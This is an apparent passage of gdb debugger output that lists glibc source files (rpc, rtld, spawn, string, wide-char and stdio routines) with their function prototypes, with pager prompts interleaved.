int __GI__rpc_dtablesize(void);

File rpc_prot.c:
---Type <return> to continue, or q <return> to quit---
void __GI__seterr_reply(struct rpc_msg *, struct rpc_err *);
bool_t __GI_xdr_accepted_reply(XDR *, struct accepted_reply *);
bool_t __GI_xdr_callhdr(XDR *, struct rpc_msg *);
bool_t __GI_xdr_des_block(XDR *, des_block *);
bool_t __GI_xdr_opaque_auth(XDR *, struct opaque_auth *);
bool_t __GI_xdr_rejected_reply(XDR *, struct rejected_reply *);
bool_t __GI_xdr_replymsg(XDR *, struct rpc_msg *);

File rpc_thread.c:

struct rpc_createerr *__GI___rpc_thread_createerr(void);
fd_set *__GI___rpc_thread_svc_fdset(void);
int *__GI___rpc_thread_svc_max_pollfd(void);
struct pollfd **__GI___rpc_thread_svc_pollfd(void);
void __rpc_thread_destroy(void);
struct rpc_thread_variables *__rpc_thread_variables(void);

static void rpc_thread_multi(void);

File rpmatch.c:
int rpmatch(const char *);

File rtime.c:
int __GI_rtime(struct sockaddr_in *, struct rpc_timeval *, struct rpc_timeval *);

File rtld.c:
void **_dl_initial_error_catch_tsd(void);
unsigned int handle_ld_preload(const char *, struct link_map *);
static Elf64_Addr _dl_start(void *);

static void dl_main(const Elf64_Phdr *, Elf64_Word, Elf64_Addr *, Elf64_auxv_t *);
static void dlmopen_doit(void *);
static unsigned int do_preload(const char *, struct link_map *, const char *);
static void *init_tls(void);
static void lookup_doit(void *);
static void map_doit(void *);
static void print_missing_version(int, const char *, const char *);
static void print_statistics(hp_timing_t *);
static void print_unresolved(int, const char *, const char *);
static void process_dl_debug(const char *);
static void relocate_doit(void *);
static void rtld_lock_default_lock_recursive(void *);
static void rtld_lock_default_unlock_recursive(void *);
---Type <return> to continue, or q <return> to quit---
static void version_check_doit(void *);

File ruserpass.c:
int __GI_ruserpass(const char *, const char **, const char **);
static int token(void);

File s_ldexp.c:
double __ldexp(double, int);

File s_ldexpf.c:
float __ldexpf(float, int);

File s_ldexpl.c:
long double __ldexpl(long double, int);

File sbrk.c:
void *__GI___sbrk(intptr_t);

File scandir-cancel.c:
void __scandir_cancel_handler(void *);

File scandir-tail.c:
int __scandir_tail(DIR *, struct dirent ***, int (*)(const struct dirent *), int (*)(const struct dirent **, const struct dirent **));

File scandir.c:
int scandir(const char *, struct dirent ***, int (*)(const struct dirent *), int (*)(const struct dirent **, const struct dirent **));

File scandirat.c:
int __GI___scandirat(int, const char *, struct dirent ***, int (*)(const struct dirent *), int (*)(const struct dirent **, 
    const struct dirent **));

File scanf.c:
int __scanf(const char *, ...);

File sched_cpualloc.c:
cpu_set_t *__sched_cpualloc(size_t);

File sched_cpufree.c:
void __sched_cpufree(cpu_set_t *);

---Type <return> to continue, or q <return> to quit---
File scratch_buffer_grow.c:
_Bool __GI___libc_scratch_buffer_grow(struct scratch_buffer *);

File scratch_buffer_grow_preserve.c:
_Bool __GI___libc_scratch_buffer_grow_preserve(struct scratch_buffer *);

File scratch_buffer_set_array_size.c:
_Bool __GI___libc_scratch_buffer_set_array_size(struct scratch_buffer *, size_t, size_t);

File secure-getenv.c:
char *__GI___libc_secure_getenv(const char *);

File seed48.c:
unsigned short *seed48(unsigned short *);

File seed48_r.c:
int __seed48_r(unsigned short *, struct drand48_data *);

File set-freeres.c:
void __GI___libc_freeres(void);

File setbuf.c:
void setbuf(_IO_FILE *, char *);

File setenv.c:
int __add_to_environ(const char *, const char *, const char *, int);
int __clearenv(void);
int __setenv(const char *, const char *, int);
int __unsetenv(const char *);
static void free_mem(void);

File setfpucw.c:
void __setfpucw(fpu_control_t);


File setlinebuf.c:
void setlinebuf(_IO_FILE *);

File setlocale.c:
char *__GI_setlocale(int, const char *);
void _nl_locale_subfreeres(void);
---Type <return> to continue, or q <return> to quit---
static char *new_composite_name(int, const char **);

File setlogin.c:
int setlogin(const char *);

File setpgrp.c:
int setpgrp(void);

File setutxent.c:
void setutxent(void);

File sgetsgent.c:
struct sgrp *sgetsgent(const char *);

File sgetsgent_r.c:
int __GI__nss_files_parse_sgent(char *, struct sgrp *, struct parser_data *, size_t, int *);
int __sgetsgent_r(const char *, struct sgrp *, char *, size_t, struct sgrp **);

File sgetspent.c:
struct spwd *sgetspent(const char *);

File sgetspent_r.c:
int __GI__nss_files_parse_spent(char *, struct spwd *, struct parser_data *, size_t, int *);
int __sgetspent_r(const char *, struct spwd *, char *, size_t, struct spwd **);

File sigaddset.c:
int __GI_sigaddset(sigset_t *, int);

File sigandset.c:
int sigandset(sigset_t *, const sigset_t *, const sigset_t *);

File sigdelset.c:
int __GI_sigdelset(sigset_t *, int);

File sigempty.c:
int __GI_sigemptyset(sigset_t *);

File siggetmask.c:
int siggetmask(void);

---Type <return> to continue, or q <return> to quit---
File sighold.c:
int sighold(int);

File sigisempty.c:
int sigisemptyset(const sigset_t *);

File sigismem.c:
int __GI_sigismember(const sigset_t *, int);

File sigjmp.c:
int __sigjmp_save(struct __jmp_buf_tag *, int);

File sigorset.c:
int sigorset(sigset_t *, const sigset_t *, const sigset_t *);

File sigrelse.c:
int sigrelse(int);

File sigvec.c:
int __sigvec(int, const struct sigvec *, struct sigvec *);

File snprintf.c:
int __snprintf(char *, size_t, const char *, ...);

File snprintf_chk.c:
int ___snprintf_chk(char *, size_t, int, size_t, const char *, ...);

File spawn.c:
int __posix_spawn(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char * const *, 

    char * const *);
int __posix_spawn_compat(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char * const *, 
    char * const *);

File spawn_faction_addclose.c:
int posix_spawn_file_actions_addclose(posix_spawn_file_actions_t *, int);

File spawn_faction_adddup2.c:
int posix_spawn_file_actions_adddup2(posix_spawn_file_actions_t *, int, int);

File spawn_faction_addopen.c:
---Type <return> to continue, or q <return> to quit---
int posix_spawn_file_actions_addopen(posix_spawn_file_actions_t *, int, const char *, int, mode_t);

File spawn_faction_destroy.c:
int posix_spawn_file_actions_destroy(posix_spawn_file_actions_t *);

File spawn_faction_init.c:
int __posix_spawn_file_actions_realloc(posix_spawn_file_actions_t *);
int posix_spawn_file_actions_init(posix_spawn_file_actions_t *);

File spawnattr_destroy.c:
int posix_spawnattr_destroy(posix_spawnattr_t *);

File spawnattr_getdefault.c:
int posix_spawnattr_getsigdefault(const posix_spawnattr_t *, sigset_t *);

File spawnattr_getflags.c:
int posix_spawnattr_getflags(const posix_spawnattr_t *, short *);

File spawnattr_getpgroup.c:
int posix_spawnattr_getpgroup(const posix_spawnattr_t *, pid_t *);

File spawnattr_getschedparam.c:
int posix_spawnattr_getschedparam(const posix_spawnattr_t *, struct sched_param *);

File spawnattr_getschedpolicy.c:
int posix_spawnattr_getschedpolicy(const posix_spawnattr_t *, int *);


File spawnattr_getsigmask.c:
int posix_spawnattr_getsigmask(const posix_spawnattr_t *, sigset_t *);

File spawnattr_init.c:
int posix_spawnattr_init(posix_spawnattr_t *);

File spawnattr_setdefault.c:
int posix_spawnattr_setsigdefault(posix_spawnattr_t *, const sigset_t *);

File spawnattr_setflags.c:
int posix_spawnattr_setflags(posix_spawnattr_t *, short);

File spawnattr_setpgroup.c:
---Type <return> to continue, or q <return> to quit---
int posix_spawnattr_setpgroup(posix_spawnattr_t *, pid_t);

File spawnattr_setschedparam.c:
int posix_spawnattr_setschedparam(posix_spawnattr_t *, const struct sched_param *);

File spawnattr_setschedpolicy.c:
int posix_spawnattr_setschedpolicy(posix_spawnattr_t *, int);

File spawnattr_setsigmask.c:
int posix_spawnattr_setsigmask(posix_spawnattr_t *, const sigset_t *);

File spawnp.c:
int __posix_spawnp(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char * const *, 
    char * const *);
int __posix_spawnp_compat(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char * const *, 
    char * const *);

File sprintf.c:
int __sprintf(char *, const char *, ...);

File sprintf_chk.c:
int ___sprintf_chk(char *, int, size_t, const char *, ...);

File srand48.c:
void srand48(long);

File srand48_r.c:
int __srand48_r(long, struct drand48_data *);

File sscanf.c:
int __sscanf(const char *, const char *, ...);

File sstk.c:
void *sstk(int);

File stack_chk_fail.c:
void __stack_chk_fail(void);

File stpcpy_chk.c:
char *__stpcpy_chk(char *, const char *, size_t);
---Type <return> to continue, or q <return> to quit---

File stpncpy_chk.c:
char *__stpncpy_chk(char *, const char *, size_t, size_t);

File str-two-way.h:
static size_t critical_factorization(const unsigned char *, size_t, size_t *);
static char *two_way_long_needle(const unsigned char *, size_t, const unsigned char *, size_t);

File strcasestr.c:
char *__strcasestr(const char *, const char *);

File strcat_chk.c:
char *__strcat_chk(char *, const char *, size_t);

File strcoll.c:
int __GI_strcoll(const char *, const char *);

File strcoll_l.c:
int __GI___strcoll_l(const char *, const char *, __locale_t);

File strcpy_chk.c:
char *__strcpy_chk(char *, const char *, size_t);

File strdup.c:
char *__GI___strdup(const char *);
char *__strdup(const char *);

File strerror.c:
char *strerror(int);

File strerror_l.c:
char *strerror_l(int, locale_t);
static void strerror_thread_freeres(void);

File strfmon.c:
ssize_t __strfmon(char *, size_t, const char *, ...);

File strfmon_l.c:
ssize_t ___strfmon_l(char *, size_t, __locale_t, const char *, ...);
ssize_t __vstrfmon_l(char *, size_t, __locale_t, const char *, struct __va_list_tag *);
---Type <return> to continue, or q <return> to quit---

File strfry.c:
char *strfry(char *);

File strftime.c:
size_t __GI_strftime(char *, size_t, const char *, const struct tm *);

File strftime_l.c:
size_t __GI___strftime_l(char *, size_t, const char *, const struct tm *, __locale_t);
size_t __GI___wcsftime_l(wchar_t *, size_t, const wchar_t *, const struct tm *, __locale_t);
static size_t __strftime_internal(char *, size_t, const char *, const struct tm *, _Bool *, __locale_t);

File strncat_chk.c:
char *__strncat_chk(char *, const char *, size_t, size_t);

File strncpy_chk.c:
char *__strncpy_chk(char *, const char *, size_t, size_t);

File strndup.c:
char *__GI___strndup(const char *, size_t);

File strops.c:
__ssize_t _IO_str_count(_IO_FILE *);
void _IO_str_finish(_IO_FILE *, int);

void _IO_str_init_readonly(_IO_strfile *, const char *, int);
void _IO_str_init_static(_IO_strfile *, char *, int, char *);
void _IO_str_init_static_internal(_IO_strfile *, char *, size_t, char *);
int __GI__IO_str_overflow(_IO_FILE *, int);
int __GI__IO_str_pbackfail(_IO_FILE *, int);
__off64_t __GI__IO_str_seekoff(_IO_FILE *, __off64_t, int, int);
int __GI__IO_str_underflow(_IO_FILE *);
static int enlarge_userbuf(_IO_FILE *, __off64_t, int);

File strptime.c:
char *__GI_strptime(const char *, const char *, struct tm *);

File strptime_l.c:
char *__strptime_internal(const char *, const char *, struct tm *, void *, __locale_t);
char *__strptime_l(const char *, const char *, struct tm *, __locale_t);

---Type <return> to continue, or q <return> to quit---
File strsep.c:
char *__strsep(char **, const char *);

File strsignal.c:
char *strsignal(int);
static void free_key_mem(void *);
static void init(void);

File strtod.c:
double __GI___strtod_internal(const char *, char **, int);
float __GI___strtof_internal(const char *, char **, int);
long double __GI___strtold_internal(const char *, char **, int);
double __GI_strtod(const char *, char **);
float __GI_strtof(const char *, char **);
long double __GI_strtold(const char *, char **);

File strtod_l.c:
double __GI_____strtod_l_internal(const char *, char **, int, __locale_t);
float __GI_____strtof_l_internal(const char *, char **, int, __locale_t);
double __GI___strtod_l(const char *, char **, __locale_t);
float __GI___strtof_l(const char *, char **, __locale_t);
static float round_and_return(mp_limb_t *, intmax_t, int, mp_limb_t, mp_size_t, int);
static const char *str_to_mpn(const char *, int, mp_limb_t *, mp_size_t *, intmax_t *, size_t, const char *, const char *);

File strverscmp.c:
int __GI___strverscmp(const char *, const char *);

File strxfrm.c:
size_t strxfrm(char *, const char *, size_t);

File strxfrm_l.c:
size_t __GI___strxfrm_l(char *, const char *, size_t, __locale_t);

File stty.c:
int stty(int, const struct sgttyb *);

File svc.c:
void __GI_svc_getreq(int);
void __GI_svc_getreq_common(const int);
void __GI_svc_getreq_poll(struct pollfd *, int);
---Type <return> to continue, or q <return> to quit---
void __GI_svc_getreqset(fd_set *);


bool_t __GI_svc_register(SVCXPRT *, rpcprog_t, rpcvers_t, void (*)(struct svc_req *, SVCXPRT *), rpcproc_t);
bool_t __GI_svc_sendreply(SVCXPRT *, xdrproc_t, caddr_t);
void __GI_svc_unregister(rpcprog_t, rpcvers_t);
void __GI_svcerr_auth(SVCXPRT *, enum auth_stat);
void __GI_svcerr_decode(SVCXPRT *);
void __GI_svcerr_noproc(SVCXPRT *);
void __GI_svcerr_noprog(SVCXPRT *);
void __GI_svcerr_progvers(SVCXPRT *, rpcvers_t, rpcvers_t);
void __GI_svcerr_systemerr(SVCXPRT *);
void __GI_svcerr_weakauth(SVCXPRT *);
void __GI_xprt_register(SVCXPRT *);
void __GI_xprt_unregister(SVCXPRT *);
void __rpc_thread_svc_cleanup(void);
void __svc_accept_failed(void);

File svc_auth.c:
enum auth_stat __GI__authenticate(struct svc_req *, struct rpc_msg *);
static enum auth_stat _svcauth_null(struct svc_req *, struct rpc_msg *);

File svc_authux.c:
enum auth_stat _svcauth_short(struct svc_req *, struct rpc_msg *);
enum auth_stat _svcauth_unix(struct svc_req *, struct rpc_msg *);

File svc_raw.c:
SVCXPRT *__GI_svcraw_create(void);
static void svcraw_destroy(SVCXPRT *);
static bool_t svcraw_freeargs(SVCXPRT *, xdrproc_t, caddr_t);
static bool_t svcraw_getargs(SVCXPRT *, xdrproc_t, caddr_t);
static bool_t svcraw_recv(SVCXPRT *, struct rpc_msg *);
static bool_t svcraw_reply(SVCXPRT *, struct rpc_msg *);

static enum xprt_stat svcraw_stat(SVCXPRT *);

File svc_run.c:
void __GI_svc_exit(void);
void __GI_svc_run(void);

File svc_simple.c:
int __registerrpc(u_long, u_long, u_long, char *(*)(char *), xdrproc_t, xdrproc_t);
static void universal(struct svc_req *, SVCXPRT *);
---Type <return> to continue, or q <return> to quit---

File svc_tcp.c:
SVCXPRT *__GI_svcfd_create(int, u_int, u_int);
SVCXPRT *__GI_svctcp_create(int, u_int, u_int);
static int readtcp(char *, char *, int);
static bool_t rendezvous_request(SVCXPRT *, struct rpc_msg *);
static enum xprt_stat rendezvous_stat(SVCXPRT *);
static void svctcp_destroy(SVCXPRT *);
static bool_t svctcp_freeargs(SVCXPRT *, xdrproc_t, caddr_t);
static bool_t svctcp_getargs(SVCXPRT *, xdrproc_t, caddr_t);
static bool_t svctcp_recv(SVCXPRT *, struct rpc_msg *);
static void svctcp_rendezvous_abort(void);
static bool_t svctcp_reply(SVCXPRT *, struct rpc_msg *);
static enum xprt_stat svctcp_stat(SVCXPRT *);
static int writetcp(char *, char *, int);

File svc_udp.c:
SVCXPRT *__GI_svcudp_bufcreate(int, u_int, u_int);
SVCXPRT *__GI_svcudp_create(int);
int __GI_svcudp_enablecache(SVCXPRT *, u_long);
static void svcudp_destroy(SVCXPRT *);
static bool_t svcudp_freeargs(SVCXPRT *, xdrproc_t, caddr_t);
static bool_t svcudp_getargs(SVCXPRT *, xdrproc_t, caddr_t);
static bool_t svcudp_recv(SVCXPRT *, struct rpc_msg *);
static bool_t svcudp_reply(SVCXPRT *, struct rpc_msg *);
static enum xprt_stat svcudp_stat(SVCXPRT *);

File svc_unix.c:
SVCXPRT *__GI_svcunix_create(int, u_int, u_int, char *);
SVCXPRT *__GI_svcunixfd_create(int, u_int, u_int);
static int readunix(char *, char *, int);
static bool_t rendezvous_request(SVCXPRT *, struct rpc_msg *);
static enum xprt_stat rendezvous_stat(SVCXPRT *);
static void svcunix_destroy(SVCXPRT *);
static bool_t svcunix_freeargs(SVCXPRT *, xdrproc_t, caddr_t);
static bool_t svcunix_getargs(SVCXPRT *, xdrproc_t, caddr_t);
static bool_t svcunix_recv(SVCXPRT *, struct rpc_msg *);

static void svcunix_rendezvous_abort(void);
static bool_t svcunix_reply(SVCXPRT *, struct rpc_msg *);
static enum xprt_stat svcunix_stat(SVCXPRT *);
---Type <return> to continue, or q <return> to quit---
static int writeunix(char *, char *, int);

File svcauth_des.c:
int __GI_authdes_getucred(const struct authdes_cred *, uid_t *, gid_t *, short *, gid_t *);
enum auth_stat _svcauth_des(struct svc_req *, struct rpc_msg *);

File swab.c:
void swab(const void *, void *, ssize_t);

File swprintf.c:
int __swprintf(wchar_t *, size_t, const wchar_t *, ...);

File swprintf_chk.c:
int __swprintf_chk(wchar_t *, size_t, int, size_t, const wchar_t *, ...);

File swscanf.c:
int __swscanf(const wchar_t *, const wchar_t *, ...);

File tcgetsid.c:
pid_t tcgetsid(int);

File tempnam.c:
char *tempnam(const char *, const char *);

File textdomain.c:
char *__textdomain(const char *);

File thread-freeres.c:
void __libc_thread_freeres(void);

File timegm.c:
time_t timegm(struct tm *);

File tmpfile.c:
FILE *__new_tmpfile(void);

File tmpnam.c:
char *tmpnam(char *);

File tmpnam_r.c:
---Type <return> to continue, or q <return> to quit---
char *tmpnam_r(char *);

File towctrans.c:
wint_t __GI___towctrans(wint_t, wctrans_t);

File towctrans_l.c:
wint_t __towctrans_l(wint_t, wctrans_t, __locale_t);

File tsearch.c:
void *__GI___tdelete(const void *, void **, __compar_fn_t);
void *__GI___tfind(const void *, void * const *, __compar_fn_t);
void *__GI___tsearch(const void *, void **, __compar_fn_t);
void __GI___twalk(const void *, __action_fn_t);

void __tdestroy(void *, __free_fn_t);
static void tdestroy_recurse(node, __free_fn_t);
static void trecurse(const void *, __action_fn_t, int);

File ttyname_r_chk.c:
int __ttyname_r_chk(int, char *, size_t, size_t);

File ttyslot.c:
int ttyslot(void);

File tzfile.c:
void __tzfile_compute(time_t, int, long *, int *, struct tm *);
void __tzfile_default(const char *, const char *, long, long);
void __tzfile_read(const char *, size_t, char **);

File tzset.c:
void __tz_compute(time_t, struct tm *, int);
struct tm *__tz_convert(const time_t *, int, struct tm *);
long __tzname_max(void);
void __tzset(void);
void __tzset_parse_tz(const char *);
char *__tzstring(const char *);
static unsigned int compute_offset(unsigned int, unsigned int, unsigned int);
static void free_mem(void);
static _Bool parse_rule(const char **, int);
static _Bool parse_tzname(const char **, int);

---Type <return> to continue, or q <return> to quit---
File unregister-atfork.c:
void __unregister_atfork(void *);

File updwtmpx.c:
void updwtmpx(const char *, const struct utmpx *);

File uselocale.c:

struct __locale_struct *__GI___uselocale(locale_t);

File utmpname.c:
int __utmpname(const char *);

File utmpxname.c:
int utmpxname(const char *);

File valid_field.c:
_Bool __nss_valid_field(const char *);

File valid_list_field.c:
_Bool __nss_valid_list_field(char **);

File vasprintf.c:
int _IO_vasprintf(char **, const char *, struct __va_list_tag *);

File vasprintf_chk.c:
int __GI___vasprintf_chk(char **, int, const char *, struct __va_list_tag *);

File vdprintf_chk.c:
int __GI___vdprintf_chk(int, int, const char *, struct __va_list_tag *);

File version.c:
const char *__gnu_get_libc_release(void);
const char *__gnu_get_libc_version(void);
void __libc_main(void);
void __libc_print_version(void);

File versionsort.c:
int versionsort(const struct dirent **, const struct dirent **);

File vfprintf.c:
---Type <return> to continue, or q <return> to quit---
int _IO_vfprintf_internal(_IO_FILE *, const char *, struct __va_list_tag *);
int _IO_vfwprintf(_IO_FILE *, const wchar_t *, struct __va_list_tag *);
static int _IO_helper_overflow(_IO_FILE *, int);
static int buffered_vfprintf(_IO_FILE *, const char *, struct __va_list_tag *);
static char *group_number(char *, char *, const char *, THOUSANDS_SEP_T);
static int printf_positional(_IO_FILE *, const char *, int, struct __va_list_tag *, __gnuc_va_list *, int, int, const unsigned char *, 
    char *, int, const char *, THOUSANDS_SEP_T);

File vfprintf_chk.c:
int ___vfprintf_chk(FILE *, int, const char *, struct __va_list_tag *);

File vfscanf.c:
int _IO_vfscanf_internal(_IO_FILE *, const char *, struct __va_list_tag *, int *);
int _IO_vfwscanf(_IO_FILE *, const wchar_t *, struct __va_list_tag *, int *);
int ___vfscanf(FILE *, const char *, struct __va_list_tag *);
int __vfwscanf(FILE *, const wchar_t *, struct __va_list_tag *);
static void char_buffer_add_slow(struct char_buffer *, char);

File vfwprintf_chk.c:
int __GI___vfwprintf_chk(FILE *, int, const wchar_t *, struct __va_list_tag *);

File vlimit.c:
int vlimit(enum __vlimit_resource, int);

File vprintf.c:
int __vprintf(const char *, struct __va_list_tag *);

File vprintf_chk.c:
int ___vprintf_chk(int, const char *, struct __va_list_tag *);

File vscanf.c:
int _IO_vscanf(const char *, struct __va_list_tag *);

File vsnprintf.c:
int _IO_vsnprintf(char *, size_t, const char *, struct __va_list_tag *);
static int _IO_strn_overflow(_IO_FILE *, int);

File vsnprintf_chk.c:
int ___vsnprintf_chk(char *, size_t, int, size_t, const char *, struct __va_list_tag *);

---Type <return> to continue, or q <return> to quit---
File vsprintf_chk.c:
int ___vsprintf_chk(char *, int, size_t, const char *, struct __va_list_tag *);
static int _IO_str_chk_overflow(_IO_FILE *, int);

File vswprintf.c:
int _IO_vswprintf(wchar_t *, size_t, const wchar_t *, struct __va_list_tag *);
static wint_t _IO_wstrn_overflow(_IO_FILE *, wint_t);

File vswprintf_chk.c:
int __GI___vswprintf_chk(wchar_t *, size_t, int, size_t, const wchar_t *, struct __va_list_tag *);

File vtimes.c:
int vtimes(struct vtimes *, struct vtimes *);

File vwprintf.c:
int __vwprintf(const wchar_t *, struct __va_list_tag *);

File vwprintf_chk.c:
int __vwprintf_chk(int, const wchar_t *, struct __va_list_tag *);

File vwscanf.c:
int __vwscanf(const wchar_t *, struct __va_list_tag *);

File wcfuncs.c:
int __GI___iswalnum(wint_t);
int __GI___iswlower(wint_t);
wint_t __GI___towlower(wint_t);
wint_t __GI___towupper(wint_t);
int __iswalpha(wint_t);
int __iswblank(wint_t);
int __iswcntrl(wint_t);
int __iswdigit(wint_t);
int __iswgraph(wint_t);
int __iswprint(wint_t);
int __iswpunct(wint_t);
int __iswspace(wint_t);
int __iswupper(wint_t);
int __iswxdigit(wint_t);



File wcfuncs_l.c:
---Type <return> to continue, or q <return> to quit---
int __GI___iswalnum_l(wint_t, __locale_t);
int __GI___iswalpha_l(wint_t, __locale_t);
int __GI___iswblank_l(wint_t, __locale_t);
int __GI___iswcntrl_l(wint_t, __locale_t);
int __GI___iswdigit_l(wint_t, __locale_t);
int __GI___iswgraph_l(wint_t, __locale_t);
int __GI___iswlower_l(wint_t, __locale_t);
int __GI___iswprint_l(wint_t, __locale_t);
int __GI___iswpunct_l(wint_t, __locale_t);
int __GI___iswspace_l(wint_t, __locale_t);
int __GI___iswupper_l(wint_t, __locale_t);
int __GI___iswxdigit_l(wint_t, __locale_t);
wint_t __GI___towlower_l(wint_t, __locale_t);
wint_t __GI___towupper_l(wint_t, __locale_t);

File wcpcpy.c:
wchar_t *__wcpcpy(wchar_t *, const wchar_t *);

File wcpcpy_chk.c:
wchar_t *__wcpcpy_chk(wchar_t *, const wchar_t *, size_t);

File wcpncpy.c:
wchar_t *__wcpncpy(wchar_t *, const wchar_t *, size_t);

File wcpncpy_chk.c:
wchar_t *__wcpncpy_chk(wchar_t *, const wchar_t *, size_t, size_t);

File wcrtomb.c:
size_t __wcrtomb(char *, wchar_t, mbstate_t *);

File wcrtomb_chk.c:
size_t __wcrtomb_chk(char *, wchar_t, mbstate_t *, size_t);

File wcscasecmp.c:
int __wcscasecmp(const wchar_t *, const wchar_t *);

File wcscat.c:
wchar_t *__wcscat(wchar_t *, const wchar_t *);

File wcscat_chk.c:
---Type <return> to continue, or q <return> to quit---
wchar_t *__wcscat_chk(wchar_t *, const wchar_t *, size_t);

File wcschrnul.c:
wchar_t *__wcschrnul(const wchar_t *, const wchar_t);

File wcscpy_chk.c:
wchar_t *__wcscpy_chk(wchar_t *, const wchar_t *, size_t);

File wcscspn.c:
size_t wcscspn(const wchar_t *, const wchar_t *);

File wcsdup.c:
wchar_t *wcsdup(const wchar_t *);

File wcsftime.c:
size_t __GI_wcsftime(wchar_t *, size_t, const wchar_t *, const struct tm *);

File wcsmbsload.c:
void __wcsmbs_clone_conv(struct gconv_fcts *);
struct __gconv_step *__wcsmbs_getfct(const char *, const char *, size_t *);
void __wcsmbs_load_conv(struct __locale_data *);
int __wcsmbs_named_conv(struct gconv_fcts *, const char *);
void _nl_cleanup_ctype(struct __locale_data *);

File wcsncase.c:
int __wcsncasecmp(const wchar_t *, const wchar_t *, size_t);

File wcsncat.c:
wchar_t *wcsncat(wchar_t *, const wchar_t *, size_t);

File wcsncat_chk.c:
wchar_t *__wcsncat_chk(wchar_t *, const wchar_t *, size_t, size_t);

File wcsncmp.c:
int wcsncmp(const wchar_t *, const wchar_t *, size_t);

File wcsncpy.c:
wchar_t *__wcsncpy(wchar_t *, const wchar_t *, size_t);

File wcsncpy_chk.c:
---Type <return> to continue, or q <return> to quit---
wchar_t *__wcsncpy_chk(wchar_t *, const wchar_t *, size_t, size_t);

File wcsnlen.c:
size_t __wcsnlen(const wchar_t *, size_t);

File wcsnrtombs.c:
size_t __wcsnrtombs(char *, const wchar_t **, size_t, size_t, mbstate_t *);

File wcsnrtombs_chk.c:
size_t __wcsnrtombs_chk(char *, const wchar_t **, size_t, size_t, mbstate_t *, size_t);

File wcspbrk.c:
wchar_t *__GI_wcspbrk(const wchar_t *, const wchar_t *);

File wcsrtombs.c:
size_t __wcsrtombs(char *, const wchar_t **, size_t, mbstate_t *);

File wcsrtombs_chk.c:

size_t __wcsrtombs_chk(char *, const wchar_t **, size_t, mbstate_t *, size_t);

File wcsspn.c:
size_t __GI_wcsspn(const wchar_t *, const wchar_t *);

File wcsstr.c:
wchar_t *wcsstr(const wchar_t *, const wchar_t *);

File wcstok.c:
wchar_t *wcstok(wchar_t *, const wchar_t *, wchar_t **);

File wcstombs.c:
size_t wcstombs(char *, const wchar_t *, size_t);

File wcstombs_chk.c:
size_t __wcstombs_chk(char *, const wchar_t *, size_t, size_t);

File wcswidth.c:
int wcswidth(const wchar_t *, size_t);

File wctob.c:
int wctob(wint_t);
---Type <return> to continue, or q <return> to quit---

File wctomb.c:
int __GI_wctomb(char *, wchar_t);

File wctomb_chk.c:
int __wctomb_chk(char *, wchar_t, size_t);

File wctrans.c:
wctrans_t __wctrans(const char *);

File wctrans_l.c:
wctrans_t __wctrans_l(const char *, __locale_t);

File wctype.c:
wctype_t __wctype(const char *);

File wctype_l.c:
wctype_t __wctype_l(const char *, __locale_t);

File wcwidth.c:
int wcwidth(wchar_t);

File wfiledoalloc.c:
int _IO_wfile_doallocate(_IO_FILE *);

File wfileops.c:
int __GI__IO_wdo_write(_IO_FILE *, const wchar_t *, size_t);
wint_t __GI__IO_wfile_overflow(_IO_FILE *, wint_t);
__off64_t __GI__IO_wfile_seekoff(_IO_FILE *, __off64_t, int, int);
wint_t __GI__IO_wfile_sync(_IO_FILE *);
wint_t __GI__IO_wfile_underflow(_IO_FILE *);
size_t __GI__IO_wfile_xsputn(_IO_FILE *, const void *, size_t);
static wint_t _IO_wfile_underflow_maybe_mmap(_IO_FILE *);
static wint_t _IO_wfile_underflow_mmap(_IO_FILE *);
static int adjust_wide_data(_IO_FILE *, _Bool);

File wgenops.c:
unsigned int _IO_adjust_wcolumn(unsigned int, const wchar_t *, int);
void _IO_init_wmarker(struct _IO_marker *, _IO_FILE *);
int _IO_seekwmark(_IO_FILE *, struct _IO_marker *, int);
---Type <return> to continue, or q <return> to quit---
wint_t _IO_sungetwc(_IO_FILE *);
void _IO_unsave_wmarkers(_IO_FILE *);
int _IO_wmarker_delta(struct _IO_marker *);
void __GI__IO_free_wbackup_area(_IO_FILE *);
__ssize_t __GI__IO_least_wmarker(_IO_FILE *, wchar_t *);
wint_t __GI__IO_sputbackwc(_IO_FILE *, wint_t);
void __GI__IO_switch_to_main_wget_area(_IO_FILE *);
void __GI__IO_switch_to_wbackup_area(_IO_FILE *);
int __GI__IO_switch_to_wget_mode(_IO_FILE *);
int __GI__IO_wdefault_doallocate(_IO_FILE *);
void __GI__IO_wdefault_finish(_IO_FILE *, int);
wint_t __GI__IO_wdefault_pbackfail(_IO_FILE *, wint_t);
wint_t __GI__IO_wdefault_uflow(_IO_FILE *);
size_t __GI__IO_wdefault_xsgetn(_IO_FILE *, void *, size_t);
size_t __GI__IO_wdefault_xsputn(_IO_FILE *, const void *, size_t);
void __GI__IO_wdoallocbuf(_IO_FILE *);
void __GI__IO_wsetb(_IO_FILE *, wchar_t *, wchar_t *, int);
wint_t __GI___woverflow(_IO_FILE *, wint_t);
wint_t __GI___wuflow(_IO_FILE *);
wint_t __GI___wunderflow(_IO_FILE *);
static int save_for_wbackup(wchar_t *, _IO_FILE *, _IO_FILE *);

File wmemchr.c:
wchar_t *__GI___wmemchr(const wchar_t *, wchar_t, size_t);

File wmemcpy.c:
wchar_t *__wmemcpy(wchar_t *, const wchar_t *, size_t);

File wmemcpy_chk.c:
wchar_t *__wmemcpy_chk(wchar_t *, const wchar_t *, size_t, size_t);

File wmemmove.c:
wchar_t *__wmemmove(wchar_t *, const wchar_t *, size_t);

File wmemmove_chk.c:
wchar_t *__wmemmove_chk(wchar_t *, const wchar_t *, size_t, size_t);

File wmempcpy.c:
wchar_t *__wmempcpy(wchar_t *, const wchar_t *, size_t);

---Type <return> to continue, or q <return> to quit---
File wmempcpy_chk.c:
wchar_t *__wmempcpy_chk(wchar_t *, const wchar_t *, size_t, size_t);

File wmemset.c:
wchar_t *__GI___wmemset(wchar_t *, wchar_t, size_t);

File wmemset_chk.c:
wchar_t *__wmemset_chk(wchar_t *, wchar_t, size_t, size_t);

File wmemstream.c:
_IO_FILE *open_wmemstream(wchar_t **, size_t *);

static void _IO_wmem_finish(_IO_FILE *, int);
static int _IO_wmem_sync(_IO_FILE *);

File wordcopy.c:
void _wordcopy_bwd_aligned(long, long, size_t);
void _wordcopy_bwd_dest_aligned(long, long, size_t);
void _wordcopy_fwd_aligned(long, long, size_t);
